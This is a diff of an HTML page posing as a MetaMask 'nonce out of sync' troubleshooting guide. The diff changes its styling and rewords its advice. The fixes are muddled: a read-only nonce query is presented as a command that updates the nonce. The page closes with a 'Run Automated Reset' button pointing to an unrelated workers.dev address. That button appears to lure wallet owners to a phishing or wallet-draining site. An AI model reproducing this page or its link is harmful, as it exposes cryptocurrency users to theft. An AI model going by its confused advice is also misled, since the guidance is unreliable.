@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: system-ui;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message stating "MetaMask nonce out of sync" when attempting to send a transaction on the Ethereum network using MetaMask.</li>
+<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum (ETH) network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when the nonce (a counter that keeps track of the number of transactions sent from an address) stored in MetaMask does not match the nonce on the Ethereum blockchain, causing a mismatch and preventing transactions from being processed.</li>
+<li>The error occurs due to a discrepancy between the expected nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often caused by cancelled or pending transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resynchronize the nonce with the blockchain:</li>
+<li>Reset the account in MetaMask to synchronize the nonce value:</li>
 <li>Delete the MetaMask extension and reinstall it</li>
-<li>Use the MetaMask interface to reset the account</li>
-<li>Manually update the nonce using the following command:</li>
+<li>Use the <code>eth_accounts</code> and <code>eth_getTransactionCount</code> RPC methods to verify the account balance and nonce</li>
+<li>Update the nonce value manually using the following command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="o">{</span><span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address&quot;</span>,
-<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...correct_nonce&quot;</span>
-<span class="o">}</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_getTransactionCount&quot;,&quot;params&quot;:[&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;,&quot;latest&quot;],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external interface for more complex overrides. </p>
+<p>Consider accessing the Ethereum network through an external console for more advanced troubleshooting capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>MetaMask extension installed and configured</li>
-<li>Ethereum wallet with a balance</li>
-<li>Access to the Ethereum blockchain via a node or provider</li>
+<li>Ethereum node or provider (e.g. Infura) set up</li>
+<li>Basic understanding of Ethereum RPC methods and JSON formatting</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
